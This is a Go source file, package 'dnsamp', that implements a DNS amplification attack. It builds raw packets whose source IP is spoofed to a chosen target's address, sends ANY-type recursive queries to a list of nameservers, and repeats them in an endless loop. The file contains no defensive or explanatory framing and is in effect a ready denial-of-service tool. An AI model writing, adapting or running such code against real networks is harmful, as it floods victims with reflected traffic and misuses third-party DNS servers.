package dnsamp

import (
	"math/rand"
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)


type Target struct {
    DomainName string
    NameServer string
}

const SRC_PORT = 42000

var options = gopacket.SerializeOptions{
        ComputeChecksums: true,
        FixLengths:       true,
}
var netIface string
var srcMac net.HardwareAddr
var dstMac net.HardwareAddr
var targetIP net.IP

func getHardwareAdress() net.HardwareAddr {
    var src_mac net.HardwareAddr
    ifaces, err := net.Interfaces()
    if err != nil {
        panic(err)
    }
    for _, iface := range ifaces {
        if iface.Name == netIface {
            src_mac = iface.HardwareAddr
        }
    }
    return src_mac
}

func Configure(iface string, destinationMac net.HardwareAddr, target net.IP) {
    netIface = iface
    dstMac = destinationMac
    srcMac = getHardwareAdress()
    targetIP = target
}

// create ANY request packet
func makePacket(domainName string, nameserverIP net.IP) []byte {
    ethernet := layers.Ethernet{
        SrcMAC: srcMac,
        DstMAC: dstMac,
        EthernetType: layers.EthernetTypeIPv4,
    }
    ip := layers.IPv4{
        Version: 4,
        TTL: 64,
        Protocol: layers.IPProtocolUDP,
        SrcIP: targetIP,
        DstIP: nameserverIP,
    }
    udp := layers.UDP{
        SrcPort: SRC_PORT,
        DstPort: 53,
    }
    udp.SetNetworkLayerForChecksum(&ip)
    qst := layers.DNSQuestion{
        Name: []byte(domainName),
        Class: layers.DNSClassIN,
        Type: layers.DNSType(layers.DNSClassAny),
    }
    dns := layers.DNS{
        RD: true,
        ID: uint16(rand.Int()),
        TC: false,
        OpCode: 0,
        Questions: []layers.DNSQuestion{qst},
    }
    buffer := gopacket.NewSerializeBuffer()
    if err := gopacket.SerializeLayers(buffer, options,
        &ethernet,
        &ip,
        &udp,
        &dns,
    ); err != nil {
        panic(err)
    }
    return buffer.Bytes()
}

func Send(servers []Target) {
    handle, err := pcap.OpenLive(netIface, 1500, false, pcap.BlockForever)
    if err != nil {
        panic(err)
    }
    // Send packets forever
    for {
        for _, server := range servers {
            nameserverIP := net.ParseIP(server.NameServer)
            // Ignore invalid lines in the file
            if nameserverIP != nil {
                packet := makePacket(server.DomainName, nameserverIP)
                err = handle.WritePacketData(packet)
                if err != nil {
                    panic(err)
                }
            }
        }
    }
}

